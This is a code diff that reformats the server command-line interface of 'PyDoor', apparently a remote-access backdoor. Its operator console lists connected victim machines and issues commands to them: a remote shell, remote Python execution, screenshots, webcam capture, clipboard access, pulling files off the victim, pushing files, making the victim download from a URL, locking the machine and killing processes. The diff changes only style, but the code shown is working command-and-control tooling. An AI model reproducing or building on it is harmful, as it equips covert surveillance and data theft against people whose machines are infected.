@@ -1,4 +1,5 @@
-""" Server CLI for PyDoor """
+"""Server CLI for PyDoor"""
+
 import cmd
 import shlex
 import logging
@@ -6,9 +7,18 @@ import socket
 import ssl
 from contextlib import suppress
 
-from modules import (clipboard, download, filetransfer, screenshot,
-                     shells, tasks, webcam, windows, network)
-from modules.baseserver import Server
+from modules import (
+    baseserver,
+    clipboard,
+    download,
+    filetransfer,
+    screenshot,
+    shells,
+    tasks,
+    webcam,
+    windows,
+    network,
+)
 from utils import terminal
 from utils.timeout_handler import timeoutsetter
 
@@ -52,29 +62,29 @@ exit
 """
 
 
-class ServerCLI(Server, cmd.Cmd):
-    """ CLI for BaseServer """
+class ServerCLI(baseserver.Server, cmd.Cmd):
+    """CLI for BaseServer"""
 
     prompt = DEFAULT_PROMPT
     client = None
 
     def __init__(self, address: tuple[str, int], ssl_context: ssl.SSLContext):
-        Server.__init__(self, address, ssl_context)
+        baseserver.Server.__init__(self, address, ssl_context)
         cmd.Cmd.__init__(self)
 
     def default(self, line):
-        """ Default error if command not found """
+        """Default error if command not found"""
         print('Command was not recognized, type "help" for help.')
 
     def do_shutdown(self, _) -> bool:
-        """ Shutdown the server """
+        """Shutdown the server"""
         self.shutdown()
         return True
 
     def do_open(self, select_id: str):
-        """ Interact with a client """
+        """Interact with a client"""
         if self.client is not None:
-            print('A client has already been selected.')
+            print("A client has already been selected.")
             return
 
         if not select_id.strip():
@@ -87,65 +97,65 @@ class ServerCLI(Server, cmd.Cmd):
         # Find a client.port starting with select_id, default None
         self.client = next(
             (client for client in clients if str(client.port).startswith(select_id)),
-            None
+            None,
         )
 
         if self.client is None:
-            print('Invalid port')
+            print("Invalid port")
             return
 
-        self.prompt = f'{self.client.address[0]}> '
+        self.prompt = f"{self.client.address[0]}> "
 
     def do_exit(self, _):
-        """ Go back to the client selection menu """
+        """Go back to the client selection menu"""
         if self.client is None:
             print("No client is selected. To shutdown the server, use 'shutdown'.")
             return
 
         self.client = None
-        self.prompt = '> '
+        self.prompt = "> "
 
     def do_list(self, _):
-        """ CLI for list """
+        """CLI for list"""
         for client in self.clients():
-            print(f'Port: {client.port} / Address: {client.address[0]}')
+            print(f"Port: {client.port} / Address: {client.address[0]}")
 
     def do_help(self, arg):
-        """ Print help message """
+        """Print help message"""
         print(INTERACT_HELP if self.client else MENU_HELP)
 
     @terminal.require_client
     def do_ping(self, _):
-        """ Get client latency """
+        """Get client latency"""
         try:
             latency = network.ping(self.client)
         except TimeoutError:
             print("Client timed out.")
         else:
-            print(f'Ping: {latency}ms')
+            print(f"Ping: {latency}ms")
 
     @terminal.require_client
     @terminal.ignore(KeyboardInterrupt)
     def do_shell(self, _):
-        """ Open a shell to client """
+        """Open a shell to client"""
         # Fetch current working directory
         cwd = self.client.cwd()
 
         # Generate client platform specific prompt
         prompt = terminal.make_prompt(self.client, cwd)
 
-        logging.debug('Launched shell (%s)', self.client.port)
+        logging.debug("Launched shell (%s)", self.client.port)
         while True:
             command = input(prompt)
 
             # Check for cases where command only affects output visually
             match command.strip():
-                case 'exit':
+                case "exit":
                     break
-                case 'clear' | 'cls':
+                case "clear" | "cls":
                     terminal.clear()
                     continue
-                case '':
+                case "":
                     continue
 
             # Extract keywords from command using shlex lexical analysis
@@ -155,7 +165,7 @@ class ServerCLI(Server, cmd.Cmd):
                 keywords = set()
 
             # Warn user that directory changes do not persist between commands
-            if any(keywords.intersection({'cd', 'chdir'})):
+            if any(keywords.intersection({"cd", "chdir"})):
                 print("Changing directory does not persist between commands!")
                 print("It is recommended to use python to change directories.")
 
@@ -172,50 +182,50 @@ class ServerCLI(Server, cmd.Cmd):
     @terminal.require_client
     @terminal.ignore(KeyboardInterrupt)
     def do_python(self, _):
-        """ Open a python interpreter to client """
-        logging.debug('Launched python interpreter (%s)', self.client.port)
+        """Open a python interpreter to client"""
+        logging.debug("Launched python interpreter (%s)", self.client.port)
         while True:
-            command = input('>>> ')
+            command = input(">>> ")
 
-            if command.strip().lower() in ('exit', 'exit()'):
+            if command.strip().lower() in ("exit", "exit()"):
                 break
 
-            print(shells.python(self.client, command), end='')
+            print(shells.python(self.client, command), end="")
 
     @terminal.require_client
     def do_screenshot(self, _):
-        """ Take a screenshot and save it in a file """
+        """Take a screenshot and save it in a file"""
         try:
             filename = screenshot.screenshot(self.client)
         except RuntimeError as error:
             print(str(error))
         else:
-            print(f'Saved screenshot: {filename}')
+            print(f"Saved screenshot: {filename}")
 
     @terminal.require_client
     def do_webcam(self, _):
-        """ Capture webcam """
+        """Capture webcam"""
         try:
             filename = webcam.webcam(self.client)
         except RuntimeError as error:
             print(str(error))
         else:
-            print(f'Saved webcam capture: {filename}')
+            print(f"Saved webcam capture: {filename}")
 
     @terminal.require_client
     def do_copy(self, _):
-        """ Copy to client clipboard """
-        text = input('Text to copy: ')
+        """Copy to client clipboard"""
+        text = input("Text to copy: ")
         try:
             clipboard.copy(self.client, text)
         except RuntimeError as error:
             print(str(error))
         else:
-            print('Copied to clipboard successfully')
+            print("Copied to clipboard successfully")
 
     @terminal.require_client
     def do_paste(self, _):
-        """ Paste from client clipboard """
+        """Paste from client clipboard"""
         try:
             content = clipboard.paste(self.client)
         except RuntimeError as error:
@@ -225,37 +235,37 @@ class ServerCLI(Server, cmd.Cmd):
 
     @terminal.require_client
     def do_receive(self, _):
-        """ Receive a file from the client """
-        filename = input('File to transfer: ')
-        save_name = input('Save file as: ')
+        """Receive a file from the client"""
+        filename = input("File to transfer: ")
+        save_name = input("Save file as: ")
         try:
             filetransfer.receive(self.client, filename, save_name)
         except RuntimeError as error:
             print(str(error))
         else:
-            print('File transferred successfully')
+            print("File transferred successfully")
 
     @terminal.require_client
     def do_send(self, _):
-        """ Send a file to client """
-        filename = input('Filename: ')
-        save_name = input('Save file as: ')
+        """Send a file to client"""
+        filename = input("Filename: ")
+        save_name = input("Save file as: ")
         try:
             filetransfer.send(self.client, filename, save_name)
         except PermissionError:
-            print('Insufficient permissions to read file.')
+            print("Insufficient permissions to read file.")
         except FileNotFoundError:
-            print('File does not exist.')
+            print("File does not exist.")
         except RuntimeError as error:
             print(str(error))
         else:
-            print('File transferred successfully')
+            print("File transferred successfully")
 
     @terminal.require_client
     def do_download(self, _):
-        """ Make the client download a file from the web """
-        url = input('File URL: ')
-        filename = input('Save file as: ')
+        """Make the client download a file from the web"""
+        url = input("File URL: ")
+        filename = input("Save file as: ")
         try:
             download.download(self.client, url, filename)
         except RuntimeError as error:
@@ -265,23 +275,23 @@ class ServerCLI(Server, cmd.Cmd):
 
     @terminal.require_client
     def do_lock(self, _):
-        """ Lock client machine """
+        """Lock client machine"""
         try:
             windows.lock_machine(self.client)
         except RuntimeError as error:
             print(str(error))
         else:
-            print('Successfully locked client machine.')
+            print("Successfully locked client machine.")
 
     @terminal.require_client
     def do_tasks(self, _):
-        """ Fetch all running tasks """
+        """Fetch all running tasks"""
         self.client.tasklist = tasks.tasks(self.client)
         terminal.task_print(self.client.tasklist)
 
     @terminal.require_client
     def do_stoptask(self, task_id: str):
-        """ Stop a task on a client """
+        """Stop a task on a client"""
         task_id = task_id.strip()
 
         if not task_id:
@@ -299,11 +309,11 @@ class ServerCLI(Server, cmd.Cmd):
         except RuntimeError as error:
             print(str(error))
         else:
-            print('Stopped task.')
+            print("Stopped task.")
 
     @terminal.require_client
     def do_output(self, task_id: str):
-        """ Given a task id, get output from finished task from client """
+        """Given a task id, get output from finished task from client"""
         task_id = task_id.strip()
 
         if not task_id:
@@ -320,20 +330,19 @@ class ServerCLI(Server, cmd.Cmd):
         except RuntimeError as error:
             print(str(error))
         else:
-            print('Output from Task:\n')
+            print("Output from Task:\n")
             print(output)
 
     @terminal.require_client
     def do_disconnect(self, _):
-        """ Disconnect a client """
+        """Disconnect a client"""
         self.disconnect(self.client)
         print("Disconnected client.")
         self.client = None
         self.prompt = DEFAULT_PROMPT
 
 
-if __name__ == '__main__':
-
+if __name__ == "__main__":
     # Create SSLContext
     context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
     context.load_cert_chain("cert.pem", "private.pem")
@@ -353,6 +362,6 @@ if __name__ == '__main__':
         except (KeyboardInterrupt, ConnectionError):
             server.client = None
             server.prompt = DEFAULT_PROMPT
-            print() # Start on a new line
+            print()  # Start on a new line
         else:
             break
